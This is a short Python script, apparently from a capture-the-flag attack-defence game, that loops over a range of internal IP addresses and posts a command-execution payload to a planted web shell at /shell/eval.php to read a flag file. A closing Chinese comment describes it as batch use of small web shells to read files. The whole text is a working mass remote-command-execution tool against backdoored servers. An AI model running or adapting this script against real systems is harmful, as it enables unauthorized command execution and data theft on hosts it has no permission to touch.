import requests
for i in range(150,161):
	url = "http://10.201.64." + str(i) + "/shell/eval.php"

	data = {

		'a':'system("type flag");'
	}

	try:
		re = requests.post(url=url, data=data, timeout=1)
		print(re.text)
	except:
		print('no')

//批量小马来读取文件